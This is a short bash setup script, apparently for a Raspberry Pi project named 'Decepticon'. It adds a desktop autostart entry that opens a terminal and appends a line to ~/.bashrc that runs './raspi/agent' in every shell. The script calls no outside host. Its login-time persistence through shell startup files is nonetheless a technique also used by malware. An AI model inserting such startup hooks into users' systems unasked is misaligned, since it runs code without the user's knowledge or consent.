#!/bin/bash
cd ~
if [ ! -d .config ]; then mkdir .config; fi
cd .config
if [ ! -d autostart ]; then mkdir autostart; fi
cd autostart
echo -e "[Desktop Entry]\nType=Application\nExec=lxterminal" >autoterm.desktop
cd ~
if [ ! -f .bashrc ]; then touch .bashrc; fi
echo -e "\n# Decepticon\n./raspi/agent" >tempcmd.txt
cat .bashrc tempcmd.txt >.bashrc.tmp
rm tempcmd.txt
mv .bashrc.tmp .bashrc
